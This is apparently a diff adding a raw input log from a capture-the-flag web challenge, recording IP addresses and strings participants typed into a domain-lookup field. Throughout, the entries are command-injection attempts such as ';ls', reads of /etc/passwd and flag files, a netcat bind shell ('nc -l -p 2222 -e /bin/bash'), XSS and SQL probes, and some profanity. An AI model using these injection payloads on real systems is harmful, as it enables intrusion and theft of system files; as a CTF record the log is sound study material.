+129.21.112.152 -- fkjshfs.slkdflskdhflksdhflkshdflkshdflkshflkshdflkhsfdlkhsfdlkhslkdfhslkhdflkshdflkhsldfkhslkhdflshdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdf
+129.21.112.152 -- fkjshfs.slkdflskdhflksdhflkshdflkshdflkshflkshdflkhsfdlkhsfdlkhslkdfhslkhdflkshdflkhsldfkhslkhdflshdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhlkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhsdlfkhslkdhflkshflkhsfdlkhsdlkfhlskhdflkhsdflkhslkdhflkshdflkhsfdlkhsdlkfhlkshdflksdflkhslkdfhlskhdflkhsdflkhsflhslkdfhlkshdflhsdlkfhslkdhflkshdflkhsdlfkhslkdhflkshdflkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdf
+129.21.112.152 -- fkjshfs.slkdflskdhflksdhflkshdflkshdflkshflkshdflkhsfdlkhsfdlkhslkdfhslkhdflkshdflkhsldfkhslkhdflshdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhslhkdflkshdflkhsdflkhlkshdflkhsdflkhsdlfkhslkdfhlskdhflkhsdhdflhsdflhsdflhslkhdflhsdflkhsdlfhslhdflkshfdlksdlfhsl
+129.21.112.152 -- google.com>
+129.21.112.152 -- google.com>ls
+129.21.112.152 -- google.com>;ls
+129.21.112.152 -- google.com[ls]
+129.21.112.152 -- google.com()
+129.21.112.152 -- google.com:
+129.21.112.152 -- google.com::::::::::::::
+129.21.112.152 -- google.com===
+129.21.112.152 -- google.com===ls
+129.21.112.152 -- google.com-----
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com
+129.21.112.152 -- ls
+129.21.112.152 -- ls.com
+129.21.112.152 -- google.com;ls\
+129.21.112.152 -- google.com;ls;ls;ls;ls;ls;ls;ls;ls;ls
+129.21.112.152 -- google.com;ls;ls;ls;ls;ls;ls;ls;ls;ls'
+129.21.112.152 -- google.com;';';';';';';';'
+
+129.21.112.152 -- google.com;';';';';';';';'/
+
+129.21.112.152 -- google.com                                             ls
+
+129.21.112.152 -- google.com                                             ;ls
+
+129.21.112.152 -- google.com                                             \ls
+
+129.21.112.152 -- google.com                                             ls#
+129.21.112.152 -- google.com                                             ls\
+129.21.112.152 -- google.com                                             ls$$$
+129.21.112.152 -- google.com                                             ls\\\\\
+129.21.112.152 -- google.com                                             ls\\\\\
+129.21.112.152 -- google.com                                             
+129.21.112.152 -- google.com                                             \032
+129.21.112.152 -- google.com                                             \031
+129.21.112.152 -- google.com                                             \034
+129.21.112.152 -- google.com                                             \035
+129.21.112.152 -- rc3.club
+129.21.112.152 -- ctf.rc3.club
+129.21.112.152 -- irc.rc3.club
+129.21.112.152 -- flag.rc3.club
+129.21.112.152 -- rc3.club;ls\
+129.21.112.152 -- rc3.club;echo hi\
+129.21.112.152 -- rc3.club;echo "hi"\
+129.21.112.152 -- rc3.club;echo this mother fucking challenge > readthisshitter.txt
+129.21.112.152 -- rc3.club[][][][][][][][
+129.21.112.152 -- ''\\;;;;;ls;;
+129.21.112.152 -- 'google.com'\\;;;;;ls;;
+129.21.112.152 -- google.com\\;;;;;ls;;
+129.21.112.152 -- google.com\n
+129.21.112.152 -- google.com
+129.21.112.152 -- google.com<xml>
+129.21.112.152 -- google.com;ls<?
+129.21.112.152 -- google.com;ls>?
+129.21.112.152 -- fuck
+129.21.112.152 -- fuckme.com
+129.21.112.152 -- 8.8.8.8
+129.21.112.152 -- f√ªck
+129.21.112.152 -- ;ls
+129.21.112.152 -- ;ls.com
+129.21.112.152 -- ;ls\
+129.21.112.152 -- google.com;ls\
+67.253.128.67 -- 127.0.0.1
+67.253.128.67 -- domain
+67.253.128.67 -- domain.com
+67.253.128.67 -- test.com
+67.253.128.67 -- rc3.club
+67.253.128.67 -- domain.com;
+67.253.128.67 -- domain.com;ls
+67.253.128.67 -- domain.com;ls
+67.253.128.67 -- test
+67.253.128.67 -- test"
+67.253.128.67 -- test.com'
+67.253.128.67 -- test.com; ls
+67.242.217.51 -- ';';ls
+67.242.217.51 -- rc3.club
+129.21.112.152 -- ;;;;'';';''
+129.21.112.152 -- google.com####;
+67.242.217.51 -- aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaassssssssssssssss
+129.21.112.152 -- google.com;\39\59\108\115
+129.21.112.152 -- google.com\39\59\108\115
+67.242.217.51 -- rc3.club'; foo
+67.242.217.51 -- rc3.club'
+67.253.128.67 -- <script>alert(1)</script>
+67.242.217.51 -- rc3.club
+67.242.217.51 -- rc3.club');
+67.253.128.67 -- test.com;
+67.242.217.51 -- rc3.club'`
+67.242.217.51 -- `asdf`
+67.242.217.51 -- rc3.club`asdf`
+67.253.128.67 -- test.com'
+67.242.217.51 -- rc3.club<$(ls)
+67.253.128.67 -- test.com"
+67.253.128.67 -- test.com ls
+67.253.128.67 -- test.com <script>alert(1)</script>
+67.253.128.67 -- test.com ls
+67.242.217.51 -- "; ls
+67.242.217.51 -- rc3.club"; ls
+67.242.217.51 -- "test.com ls"
+67.242.217.51 -- test.com ls
+67.242.217.51 -- a
+67.242.217.51 -- ben.steve
+67.253.128.67 -- test.com'
+67.253.128.67 -- domain.com
+67.242.217.51 -- blahblahblah.foo
+129.21.112.152 -- f√ªck
+129.21.112.152 -- ;';';';';'ls
+129.21.112.152 -- google.com;';ls
+67.242.217.51 -- -
+67.242.217.51 -- - foo.com
+67.253.128.67 -- test.com 
+67.253.128.67 -- test.com
+67.242.217.51 -- test.com -debug
+67.253.128.67 -- test.com'; ls
+67.242.217.51 -- test.com& ls
+67.242.217.51 -- test.com&foo
+67.242.217.51 -- test.com`foo
+67.242.217.51 -- test.com`foo`
+67.253.128.67 -- test.com 
+67.242.217.51 -- test.com;foo
+67.242.217.51 -- test.com<foo
+67.242.217.51 -- test.com>foo
+67.253.128.67 -- test.com
+ls
+67.242.217.51 -- test.com'asdf'
+67.253.128.67 -- test.com;
+ls
+67.242.217.51 -- test.com$PATH
+67.242.217.51 -- test.com$$PATH
+67.253.128.67 -- rit.edu
+67.242.217.51 -- test.com"asdf"
+67.242.217.51 -- test.com'asdf'
+67.242.217.51 -- test.com"ls"
+67.242.217.51 -- test.com";"ls
+67.242.217.51 -- test.com#
+67.242.217.51 -- test.com%PATH%
+67.242.217.51 -- test.com %PATH%
+67.242.217.51 -- test.com$foo
+67.242.217.51 -- test.com#foo
+67.242.217.51 -- test.com #foo
+67.253.128.67 -- test.com
+67.242.217.51 -- ''
+67.242.217.51 -- test.com 'asdf'
+67.242.217.51 -- test.com'$foo'
+67.242.217.51 -- test.com'$PATH'
+67.242.217.51 -- test.com' $PATH'
+67.242.217.51 -- test.com'$(ls)'
+67.253.128.67 -- test.com'$PATH'
+67.253.128.67 -- test.com'$FLAG'
+67.253.128.67 -- test.com'$flag'
+67.242.217.51 -- test.com'$FLAG'
+67.242.217.51 -- test.com'$USER'
+67.242.217.51 -- test.com'$SHELL'
+67.242.217.51 -- test.com'$PWD'
+129.21.112.152 -- test.com '$PATH'
+129.21.112.152 -- test.com '$PATH'
+129.21.112.152 -- test.com'$PATH'
+67.242.217.51 -- test.com'$PWD/*'
+67.253.128.67 -- test.com'$PWD'
+129.21.112.152 -- test.com'$PWD'
+129.21.112.152 -- test.com'$LS'
+129.21.112.152 -- test.com'$USER'
+67.242.217.51 -- test.com'$(<flag)'
+67.242.217.51 -- test.com'$(<flag.txt)'
+129.21.112.152 -- test.com'$UID'
+67.242.217.51 -- test.com'$(<index.php)'
+67.253.128.67 -- test.com'$HOME'
+129.21.112.152 -- test.com'$HELP'
+67.253.128.67 -- test.com'$PWD'
+129.21.112.152 -- test.com'$FLAG'
+129.21.112.152 -- test.com'ls'
+129.21.112.152 -- test.com'$ls'
+67.242.217.51 -- test.com'*'
+67.242.217.51 -- test.com'{1,2}'
+67.253.128.67 -- test.com'$USER'
+67.242.217.51 -- test.com"$PATH"
+67.242.217.51 -- test.com'$SHELL'
+129.21.112.152 -- test.com'$PRINT'
+129.21.112.152 -- test.com'$ALL'
+67.253.128.67 -- test.com'$pwd'
+129.21.112.152 -- test.com'$PATH'
+129.21.112.152 -- test.com'$USR'
+67.253.128.67 -- test.com'$PWD'
+129.21.112.152 -- test.com'$USER'
+129.21.112.152 -- test.com'$HOME'
+129.21.112.152 -- test.com'$SHELL'
+67.242.217.51 -- test.com'$(</etc/passwd)'
+129.21.112.152 -- test.com'$PATH;ls'
+129.21.112.152 -- test.com'$PATH;cat logs'
+67.242.217.51 -- test.com'$$'
+129.21.112.152 -- test.com'$PATH;cat 'logs''
+129.21.112.152 -- test.com'$PATH;ls'
+129.21.112.152 -- test.com'$PATH; ls'
+67.242.217.51 -- test.com'$0'
+67.242.217.51 -- test.com'$PATH;'
+67.253.128.67 -- test.com
+67.242.217.51 -- t.co'$PATH;ls'
+129.21.112.152 -- test.com'ls;'
+67.253.128.67 -- test.com'$PATH;ls'
+129.21.112.152 -- test.com'$PATH;cat logs'
+67.242.217.51 -- t.co'$@'
+67.253.128.67 -- test.com'$PATH;ls -l ./logs/'
+129.21.112.152 -- test.com'$(cat logs)'
+129.21.112.152 -- test.com'$(ls)'
+67.253.128.67 -- test.com'$PATH;ls'
+129.21.112.152 -- test.com'$\(ls\)'
+129.21.112.152 -- test.com'$PATH'
+67.253.128.67 -- test.com'$PATH;cat /etc/passwd'
+129.21.112.152 -- test.com'$PATH;ls'
+129.21.112.152 -- test.com'$PATH;ls'
+129.21.112.152 -- test.com'$PATH;nc -l -p 2222'
+67.242.217.51 -- t.co'$PATH;ls'
+129.21.112.152 -- test.com'$PATH;nc -l -p 2222 -e /bin/bash'
+67.253.128.67 -- test.com'$PATH;ls -l /home/dad'
+67.253.128.67 -- test.com'$PATH;cat /etc/passwd'
+67.242.217.51 -- t.co'$PATH;cat '
+67.242.217.51 -- t.co'$PATH;cat logs'
+129.21.112.152 -- test.com'$PATH;whoami'
+67.253.128.67 -- test.com'$PATH;ls -a /home/dad'
+67.242.217.51 -- test.com'$PATH;cat /etc/passwd'
+67.242.217.51 -- t.co'$PATH;ls'
+67.242.217.51 -- t.co'$PATH;ls .'
+67.242.217.51 -- t.co'$PATH;ls ..'
+67.253.128.67 -- test.com'$PATH;cat /home/dad/.bashrc'
+67.242.217.51 -- t.co'$PATH;ls -a'
+67.242.217.51 -- t.co'$PATH;cat .flag'
+129.21.112.152 -- test.com'$PATH;cat'
+67.253.128.67 -- test.com'$PATH;ls -a'
+67.253.128.67 -- test.com'$PATH;cat .flag'
+104.32.56.41 -- '"$(ls -lhat)"'
+66.66.110.169 -- 162.243.36.71
+66.66.110.169 -- google.com
+66.66.110.169 -- *
+66.66.110.169 -- google.com
+66.66.110.169 -- google.com';'ls
+66.66.110.169 -- google.com';cat logs;'ls
+66.66.110.169 -- google.com';cat logs;cat index.php;'ls
+66.66.110.169 -- google.com';cat logs;'ls
+66.66.110.169 -- google.com';cat index.php;'ls
+66.66.110.169 -- google.com';'cat logs';'ls
+66.66.110.169 -- ';'cat logs';'ls
+66.66.110.169 -- google.com';'cat logs';'ls
+66.66.110.169 -- google.com';'cat logs';'ls -l
+66.66.110.169 -- google.com';cat logs;'ls
+66.66.110.169 -- google.com';echo "test";'ls
+66.66.110.169 -- google.com';cat logs;'ls
+66.66.110.169 -- google.com';cat favicon.ico;'ls
+66.66.110.169 -- google.com';df -h;'ls
+66.66.110.169 -- google.com';head logs;'ls
+66.66.110.169 -- google.com';pwd;'ls
+66.66.110.169 -- google.com';'ls ../
+66.66.110.169 -- google.com';sudo cat logs;'ls
+66.66.110.169 -- google.com';cat logs > logs.txt;'ls
+66.66.110.169 -- google.com';cat logs > logs.txt;'ls
+66.66.110.169 -- google.com';cat logs | echo ;'ls
+66.66.110.169 -- google.com';'ls -l
+66.66.110.169 -- google.com';chmod 777 logs;'ls
+66.66.110.169 -- google.com';cat logs;'ls
+66.66.110.169 -- < logs
+66.66.110.169 -- google.com';tail logs;'ls
+66.66.110.169 -- google.com';tail logs;'ls ../
+66.66.110.169 -- google.com';'ls ../
+66.66.110.169 -- google.com';cd ..;'ls
+66.66.110.169 -- google.com';cd ..;'ls';'pwd
+66.66.110.169 -- google.com';cd ..;cd ..;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cat cache;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cat *;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd backups;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd backups;cat pass*'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd backups;cat pass*;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd backups;cat passwd.bak;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd log;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd log;cat auth.log;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd log;cat syslog;'ls
+66.66.110.169 -- google.com';cd ..;cd ..; cd ..;find -name flag;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd mail;'ls
+66.66.110.169 -- google.com';cd ..;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;'ls
+66.66.110.169 -- google.com';cd .;'ls
+66.66.110.169 -- google.com';cd \;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd ..;cd ..;cat /etc/passwd;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd ..;cd ..;cd /var/backups;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd ..;cd ..;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd ..;cd ..;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd ..;cd ..;find -name flag -type f;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd ..;cd ..;find -name log -type f;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd ..;cd ..;find -name 'log' -type 'f';'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd ..;cd ..;'find -name log -type f';'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd ..;cd ..;locate file;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd ..;cd ..;locate flag;'ls
+66.66.110.169 -- google.com';cd ..;cd ..;cd ..;cd ..;cat /var/www/html/.flag;'ls
+104.32.56.41 -- google.com
+104.32.56.41 -- google.com
+104.32.56.41 -- 'google.com'
+104.32.56.41 -- google.com && cat /etc/passwd
+104.32.56.41 -- google.com && cat /etc/passwd
+104.32.56.41 -- google.com' && cat /etc/passwd'
+104.32.56.41 -- google.com '&& ls -lhat'
+104.32.56.41 -- google.com'&& ls -lhat'
+104.32.56.41 -- google.com'&& cat .flag'
+70.171.32.108 -- m.u
+70.171.32.108 -- mu
+70.171.32.108 -- m.m
+70.171.32.108 -- m.m;
+69.80.162.196 -- 127.0.0.1
+69.80.162.196 -- hello.poop
+129.21.62.119 -- google.com
+69.80.162.196 -- hello.nyc; ping 8.8.8.8
+69.80.162.196 -- rc3.club; ping 8.8.8.8
+69.80.162.196 -- rc3.club
+69.80.162.196 -- rc3.club; ping 8.8.8.8
+129.21.26.205 -- google.com
+129.21.26.205 -- google.com
+129.21.26.205 -- google.com;
+129.21.26.205 -- google.com
+129.21.26.205 -- google.com`;
+129.21.26.205 -- google.com`;
+129.21.26.205 -- google.com`; ls;#
+129.21.26.205 -- google.com
+129.21.26.205 -- google.com;
+129.21.26.205 -- google.com";#
+129.21.26.205 -- google.com` or 1=1;#
+129.21.26.205 -- ` or 1=1
+129.21.26.205 -- h
+69.80.162.147 -- google.com
+129.21.26.205 -- google.com
+69.80.162.147 -- goog.com;echo lo
+69.80.162.147 -- google.cmo
+129.21.26.205 -- google.com`#
+69.80.162.147 -- fuck.com
+69.80.162.147 -- safadfs
+129.21.26.205 -- google.com`;#
+69.80.162.147 -- fuck
+69.80.162.147 -- fuck.com
+129.21.26.205 -- google.com];#
+69.80.162.147 -- <b>lol</b>
+69.80.162.147 -- <b>lol</b>.com
+69.80.162.147 -- <b>lol.com</b>
+69.80.162.147 -- lol
+69.80.162.147 -- lol.com
+69.80.162.147 -- lol.com<br>
+69.80.162.147 -- lol.com<b>lol</b>
+69.80.162.147 -- ;
+69.80.162.147 -- google.com;echo "fuck
+69.80.162.147 -- google.com;echo "fuck"
+69.80.162.147 -- ;
+69.80.162.147 -- ;echo "lol"
+69.80.162.147 -- "google.com
+69.80.162.147 -- google.com')
+69.80.162.147 -- google.com'
+69.80.162.147 -- google.com')
+69.80.162.147 -- google.com')
+69.80.162.147 -- LOOFLFLFLDSFL.com
+69.80.162.196 -- rc3.club
+69.80.162.196 -- jfdsljksdfjldslj
